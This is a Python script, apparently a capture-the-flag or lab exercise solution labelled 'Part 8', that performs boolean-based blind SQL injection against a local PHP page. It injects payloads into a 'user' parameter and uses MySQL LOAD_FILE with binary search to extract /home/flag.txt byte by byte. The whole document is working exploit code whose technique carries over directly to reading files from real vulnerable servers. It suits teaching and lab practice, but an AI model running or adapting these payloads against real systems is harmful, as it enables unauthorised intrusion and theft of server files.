import requests

url = "http://localhost:8000/blindsqli.php"
true_indicator = "In wonderland right now"

# Update this cookie if the session expires
my_cookies = {
    'PHPSESSID': '414170264f5da76958870da216138b7c'
}

def path_to_char(path):
    # Convert file path string to SQL CHAR() notation to avoid single-quote conflicts.
    return "CHAR(" + ",".join(str(ord(c)) for c in path) + ")"

def check_connection():
    res = requests.get(url, params={'user': "alice' AND 1=1 #"}, cookies=my_cookies)
    if true_indicator in res.text:
        print("Sanity check passed! The server is responding.\n")
        return True
    else:
        print("Sanity check failed!\n")
        return False

def get_file_length(path_char):
    # Binary search for exact file length using LENGTH(LOAD_FILE(...)).
    lo, hi = 0, 500
    # First confirm file exists and has some content
    payload = f"alice' AND LENGTH(LOAD_FILE({path_char}))>0 #"
    res = requests.get(url, params={'user': payload}, cookies=my_cookies)
    if true_indicator not in res.text:
        return 0

    while lo < hi:
        mid = (lo + hi + 1) // 2
        payload = f"alice' AND LENGTH(LOAD_FILE({path_char}))>={mid} #"
        res = requests.get(url, params={'user': payload}, cookies=my_cookies)
        if true_indicator in res.text:
            lo = mid
        else:
            hi = mid - 1
    return lo

def extract_flag(file_path="/home/flag.txt"):
    path_char = path_to_char(file_path)

    print("  Determining file length...", end='', flush=True)
    length = get_file_length(path_char)
    print(f" {length} bytes")

    if length == 0:
        return b""

    flag_bytes = []
    print("  Reading: ", end='', flush=True)

    for i in range(1, length + 1):
        lo, hi = 0, 255
        while lo < hi:
            mid = (lo + hi) // 2
            payload = f"alice' AND ASCII(SUBSTRING(LOAD_FILE({path_char}),{i},1))>{mid} #"
            response = requests.get(url, params={'user': payload}, cookies=my_cookies)
            if true_indicator in response.text:
                lo = mid + 1
            else:
                hi = mid
        byte_val = lo
        flag_bytes.append(byte_val)
        char = chr(byte_val) if 32 <= byte_val < 127 else f"\\x{byte_val:02x}"
        print(char, end='', flush=True)

    print()
    return bytes(flag_bytes)

if __name__ == "__main__":
    print("Part 8: Reading /home/flag.txt via Blind SQLi + LOADFILE (UNION SELECT style)\n")

    path = "/home/flag.txt"

    if check_connection():
        print(f"Trying {path} ...")
        flag = extract_flag(file_path=path)
        if flag:
            print(f"Hex:     {flag.hex()}")
            try:
                print(f"As text: {flag.decode('utf-8')}")
            except Exception:
                print(f"As latin-1: {flag.decode('latin-1')}")
        else:
            print("  (empty — file missing or no FILE privilege)\n")
